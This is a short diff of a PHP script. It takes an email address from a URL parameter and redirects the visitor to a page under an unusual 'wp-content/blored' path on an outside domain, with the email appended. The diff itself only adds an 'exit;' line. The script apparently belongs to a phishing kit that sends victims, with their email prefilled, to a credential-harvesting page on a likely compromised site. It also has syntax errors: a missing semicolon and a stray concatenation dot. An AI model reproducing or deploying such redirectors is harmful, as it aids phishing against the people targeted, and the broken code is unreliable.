@@ -2,6 +2,7 @@
 $email = $_GET['data']
 
 header("Location: https://careerco.ca/wp-content/blored/?connect&data=".$email.);
+exit;
 
 ?>
 
